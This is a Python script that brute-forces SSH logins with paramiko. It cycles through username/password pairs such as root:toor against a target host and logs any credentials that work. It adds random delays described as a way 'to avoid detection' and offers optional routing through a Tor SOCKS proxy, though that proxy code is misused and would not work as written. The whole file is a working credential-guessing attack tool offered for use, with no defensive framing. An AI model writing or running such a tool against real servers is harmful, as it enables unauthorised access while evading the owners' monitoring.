import paramiko
import time
import random
import logging
from typing import List, Tuple

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def try_ssh_login(
    hostname: str,
    credentials: List[Tuple[str, str]],
    port: int = 22,
    proxy: str = None,
    delay: bool = True
) -> Tuple[bool, str, str]:
    """
    Attempt SSH login using provided credentials.
    Supports proxy and random delays to avoid detection.
    
    Args:
        hostname: Target host (IP/Domain)
        credentials: List of (username, password) tuples
        port: SSH port (default: 22)
        proxy: Proxy URL (e.g., "socks5://127.0.0.1:9050")
        delay: Add random delay between attempts (default: True)
    
    Returns:
        (success, username, password) tuple
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.WarningPolicy())  # Safer than AutoAddPolicy
    
    for username, password in credentials:
        try:
            if proxy:
                sock = paramiko.proxy.ProxyCommand(proxy)
                ssh.connect(
                    hostname,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5,
                    sock=sock
                )
            else:
                ssh.connect(
                    hostname,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5
                )
            
            logger.info(f"Successful login: {username}:{password}")
            ssh.close()
            return True, username, password
            
        except paramiko.AuthenticationException:
            logger.debug(f"Failed login: {username}:{password}")
        except (paramiko.SSHException, TimeoutError) as e:
            logger.warning(f"Connection error: {e}")
            time.sleep(5)  # Back off on connection errors
        finally:
            ssh.close()
        
        if delay:
            time.sleep(random.uniform(1, 5))  # Random delay to avoid detection
            
    return False, "", ""

def main():
    target = "example.com"
    creds = [
        ("admin", "password123"),
        ("root", "toor"),
        ("user", "password")
    ]
    
    # Example with proxy (optional)
    # proxy = "socks5://127.0.0.1:9050"
    proxy = None
    
    success, user, pwd = try_ssh_login(target, creds, proxy=proxy, delay=True)
    if success:
        print(f"[+] Login successful - {user}:{pwd}")
    else:
        print("[-] All login attempts failed")

if __name__ == "__main__":
    main()